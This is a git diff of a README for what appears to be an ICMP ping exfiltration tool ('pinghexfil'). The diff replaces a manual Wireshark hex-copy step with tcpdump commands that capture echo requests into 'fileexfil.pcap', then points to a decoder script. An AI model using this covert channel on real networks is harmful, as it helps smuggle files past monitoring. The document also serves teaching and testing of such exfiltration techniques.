@@ -19,11 +19,20 @@ Sent 1 packets.
 Exiting.
 root@demon:~/pinghexfil# 
 ```
-### Step 2: Gather Bytes via Wireshark
-Simply right click on the data and choose **Select->as a Hex Stream** and paste the output into a file, as I did in the file `payloads/example1.txt`
-
-![Wireshark Screenshot](images/wireshark.png)
-
+### Step 2: Listen for ICMP Requests on Destination
+To do this we can simply use tcpdump:
+```
+root@demon:~/# tcpdump -vvi lo icmp[icmptype]==8 -w fileexfil.pcap
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+^C2 packets captured
+4 packets received by filter
+0 packets dropped by kernel
+root@demon:~/# 
+```
+Then view with *Wireshark*:
+```
+root@demon:/# wireshark fileexfil.pcap
+```
 ### Step 3: Decode the Bytes
 ```
 root@demon:~/pinghexfil# ./decoder.py payloads/example1.txt 
